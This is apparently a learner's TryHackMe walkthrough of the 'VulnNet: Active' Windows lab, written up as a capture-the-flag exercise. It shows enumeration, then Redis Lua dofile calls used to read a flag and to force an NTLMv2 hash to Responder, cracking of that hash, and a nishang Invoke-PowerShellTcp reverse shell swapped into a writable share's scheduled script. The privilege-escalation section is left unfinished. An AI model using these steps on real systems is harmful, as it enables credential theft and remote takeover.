<h1 align="center">VulnNet: Active</h1>
<p align="center">2025, September 7<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>VulnNet Entertainment just moved their entire infrastructure... Check this out...</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/183b30b9-5b5a-425b-83ba-d289f3914547"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/vulnnetactive">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/0a1d082c-2699-4840-bd3b-8329402384a0"></p>

<br>
<h2>Task 1 . VulnNet: Active</h2>
<p>﻿VulnNet Entertainment had a bad time with their previous network which suffered multiple breaches. Now they moved their entire infrastructure and hired you again as a core penetration tester. Your objective is to get full access to the system and compromise the domain.<br><br>

- Difficulty: Medium
- Operating System: Windows<br><br>
Another Windows machine. Do your best and breach it, good luck!<br><br>

Note: Since this is a windows machine you might need to give it up to 5 minutes to boot.<br><br>

Icon made by <a href="https://www.freepik.com/">Freepik</a> from <a href="http://www.flaticon.com/">www.flaticon.com</a></p>

<p><em>Answer the questions below</em></p>

<br>


<h2>Nmap</h2>
<p> 14 open ports:

- &nbsp;&nbsp;&nbsp; <code>53</code> &nbsp; : &nbsp; DNS<br>
- &nbsp; &nbsp; <code>135</code> &nbsp; : &nbsp; MSRPC<br>
- &nbsp;&nbsp; <code>139</code> &nbsp; : &nbsp; SMB<br>
- &nbsp;&nbsp; <code>445</code> &nbsp; : &nbsp; SMB<br>
- &nbsp;&nbsp; <code>464</code> &nbsp; : &nbsp; kpasswd5<br>
- &nbsp; <code>6379</code> &nbsp; : &nbsp; Redis &nbsp; : &nbsp; 2.8.2402<br>
- &nbsp; <code>9389</code> &nbsp; : &nbsp; .Net Message Framing<br>
- <code>49666</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49668</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49669</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49670</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49677</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49704</code> &nbsp; : &nbsp; Microsoft Windows RPC<br>
- <code>49796</code> &nbsp; : &nbsp; Microsoft Windows RPC</p>

```bash
:~/VulnNetActive# nmap -sT xx.xxx.x.xxx
...
PORT    STATE SERVICE
53/tcp  open  domain
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
464/tcp open  kpasswd5
```

```bash
:~/VulnNetActive# nmap -sC -sV -Pn -p- -T4 xx.xxx.x.xxx
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49796/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: VULNNET-BC3TCK1, NetBIOS user: <unknown>, NetBIOS MAC: xx:xx:xx:xx:xx:xx (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-xx-xxTxx:xx:xx
|_  start_date: N/A
```

<h2>enum4linux</h2>

<p>

- Got domain/workgroup name: VULNNET<br>
- VULNNET-BC3TCK1 <20> -         B <ACTIVE>  File Server Service<br>
- VULNNET-BC3TCK1 <00> -         B <ACTIVE>  Workstation Service<br>
- Server vulnnet.thm allows sessions using username '', password ''<br>
- SMB1 disabled -- no workgroup available</p>

```bash
:~/VulnNetActive# enum4linux -a vulnnet.thm
...
 ========================== 
|    Target Information    |
 ========================== 
Target ........... vulnnet.thm
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on vulnnet.thm    |
 =================================================== 
[+] Got domain/workgroup name: VULNNET

 =========================================== 
|    Nbtstat Information for vulnnet.thm    |
 =========================================== 
Looking up status of xx.xxx.xx.xx
	VULNNET-BC3TCK1 <20> -         B <ACTIVE>  File Server Service
	VULNNET-BC3TCK1 <00> -         B <ACTIVE>  Workstation Service
	VULNNET         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	VULNNET         <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	VULNNET         <1b> -         B <ACTIVE>  Domain Master Browser

	MAC Address = xx-xx-xx-xx-xx-xx

 ==================================== 
|    Session Check on vulnnet.thm    |
 ==================================== 
[+] Server vulnnet.thm allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for vulnnet.thm    |
 ========================================== 
Domain Name: VULNNET
Domain Sid: S-1-5-21-1405206085-1650434706-76331420
[+] Host is part of a domain (not a workgroup)

 ===================================== 
|    OS information on vulnnet.thm    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for vulnnet.thm from smbclient: 
[+] Got OS info for vulnnet.thm from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on vulnnet.thm    |
 ============================ 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ======================================== 
|    Share Enumeration on vulnnet.thm    |
 ======================================== 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on vulnnet.thm

 =================================================== 
|    Password Policy Information for vulnnet.thm    |
 =================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
...
 ====================================================================== 
|    Users on vulnnet.thm via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================ 
|    Getting printer info for vulnnet.thm    |
 ============================================ 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
```

<h2>crackmapexec smb</h2>

```bash
:~/VulnNetActive# crackmapexec smb vulnnet.thm
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```

<h2>rpcdump</h2>

```bash
:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm > report
```

```bash
:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | grep Print
```

```bash
:~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
```

<img width="1092" height="153" alt="image" src="https://github.com/user-attachments/assets/0000e99c-8695-430d-8749-512b6cc1d2d0" />

<br>
<br>
<br>
<h2>nxc smb</h2>

```bash
:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p 'xx.xxx.x.xxx'
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:***************
```

```bash
:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p '***************' --continue-on-success
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:***************
```

```bash
:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p 'xx.xxx.x.xxx' --shares
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:*************** 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  C$                              Default share
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE      
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
```


```bash
:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p '***************' --users
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:***************
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Administrator                 2021-02-24 00:49:00 0       Built-in account for administering the computer/domain 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  krbtgt                        2021-02-23 09:32:07 0       Key Distribution Center Service Account 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  enterprise-security           2021-02-23 23:01:37 0       TryHackMe 
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  jack-goldenhand               2021-02-23 21:54:57 0        
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  tony-skid                     2021-02-23 21:56:53 0        
SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Enumerated 6 local users: VULNNET
```

<br>
<h2>Redis</h2>

```bash
:~/VulnNetActive# apt install redis-tools
```

```bash
:~/VulnNetActive# redis-cli -h vulnnet.thm
vulnnet.thm:6379>
```

<img width="1091" height="142" alt="image" src="https://github.com/user-attachments/assets/b750486e-2402-46a3-96d7-237fce0b9761" />

<br>
<br>

```bash 
vulnnet.thm:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:2112
run_id:fd5deedf4803915e1c9d9977c607e834a7d47642
...
```

```bash 
vulnnet.thm:6379> CONFIG GET pidfile
1) "pidfile"
2) "/var/run/redis.pid"
```

```bash
vulnnet.thm:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "dump.rdb"
```

```bash
vulnnet.thm:6379> CONFIG GET logfile
1) "logfile"
2) ""
```

<p>

- C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402</p>

```bash
vulnnet.thm:6379> CONFIG GET dir
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```

```bash
vulnnet.thm:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
...
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
...
```

<h4>Reponder</h4>

```bash
:~/VulnNetActive# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

...
[+] Listening for events...
```

<br>

```bash
vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_...): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
```

<img width="1086" height="106" alt="image" src="https://github.com/user-attachments/assets/30437ddd-c49c-425c-8407-688916217194" />

<br>
<br>

```bash
vulnnet.thm:6379> eval "dofile('\\\\xx.xxx.x.xxx\\\\test')" 0
(error) ERR Error running script (call to f_...): @user_script:1: cannot open \xx.xxx.x.xxx\test: No such file or directory
```

<br>
<br>

```bash
vulnnet.thm:6379> CONFIG SET dir \\xx.xxx.x.xxx\share
(error) ERR Changing directory: Permission denied
```

<h4>Reponder</h4>

```bash
[SMB] NTLMv2-SSP Client   : ::ffff:xx.xxx.x.xxx
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:6892ced64ce981aa:76D09B9530D10553EF6ED...0390058004B0001001E00570049004E002D00360041005000370033004A0034005A0047004...0030002E003200300031002E0039002E003100330038000000000000000000
```


<h2>Hash Cracking</h2>

```bash
:~/VulnNetActive# nano hash
```

```bash
:~/VulnNetActive# john --format=netntlmv2 hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**************  (enterprise-security)
1g 0:00:00:06 DONE (2025-09-07 xx:xx) 0.1536g/s 616602p/s 616602c/s 616602C/s *****!****..*******
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

<h2>Invoke-PowerShellTcp.ps1</h2>

```bash
:~/VulnNetActive# smbclient \\\\xx.xxx.x.xxx\\Enterprise-Share -U enterprise-security@vulnnet.local
Password for [enterprise-security@vulnnet.local]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep  7 xx:xx:xx 2025
  ..                                  D        0  Mon Sep  7 xx:xx:xx 2025
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 00:33:18 2021

		9558271 blocks of size 4096. 4994656 blocks available
```

<p>

- download <code>https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1</code><br>
- add <code>Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.x.xxx -Port xxxx</code> to <code>Invoke-PowerShellTcp.ps1</code></p>


```bash
:~/VulnNetActive# wget https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1 -o Invoke-PowershellTcp.ps1
```

```bash
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.x.xxx -Port xxxx
```


```bash
:~/VulnNetActive# mv Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1
```

```bash
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (4300.4 kb/s) (average 4300.8 kb/s)
smb: \> 
```

<h2></h2>

```bash
:~/VulnNetActive# nc -nlvp 1234
Listening on 0.0.0.0 1234
...
Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\enterprise-security\Downloads>
```

<img width="1290" height="628" alt="image" src="https://github.com/user-attachments/assets/fe62514c-b69d-4470-a475-be13f27f336f" />

<img width="1298" height="617" alt="image" src="https://github.com/user-attachments/assets/9b0c793d-5f28-41f1-b4e4-52879ab64313" />


<br>
<p>1.1.  What is the user flag? (Desktop\user.txt)<br>
<code>THM{*****************************}</code></p>
<br>


```bash
PS C:\Users\enterprise-security\Downloads> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```





<img width="1293" height="177" alt="image" src="https://github.com/user-attachments/assets/5c449796-39fd-43bd-a50e-5d89d5fcc915" />


<img width="1265" height="248" alt="image" src="https://github.com/user-attachments/assets/c26c4acd-6ac6-4f82-8652-686ecfab3625" />

<br>
<br>
<p>Walkthrough will be completed ... I invest a lot of time writing it and learn a lot.</p>


<br>
<p>1.2. What is the system flag? (Desktop\system.txt)<br>
<code>THM{*********************************}</code>

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/f48ec7e1-eebd-4617-9eb6-d30461f0204b"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/b111cb52-637a-4f54-bc3f-4bf1ec5665f9"></p>

<h2 align="center">My TryHackMe Journey</h2>


<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 7       |Medium 🚩 - <code><strong>VulnNet: Active</strong></code>| 489| 114ᵗʰ | 5ᵗʰ   |    542ⁿᵈ    |     9ᵗʰ    | 124,746  |  950      |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489|     114ᵗʰ |     5ᵗʰ      |    535ᵗʰ   |     9ᵗʰ    | 124,716  |  949      |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   114ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/65102bbc-fd6c-40d2-aac3-ff660919f235"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/096ee236-d33c-4c4a-8438-773100abcf5c"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c4d7797d-f623-423d-abcc-aaa38c17a734"><br>
                  Global monthly:    542ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/7df95781-b9f3-483a-9dc5-9b4f80b5dd0d"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/62fdb1ba-7d15-4ab6-ac5f-192bdb27d5b0"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>

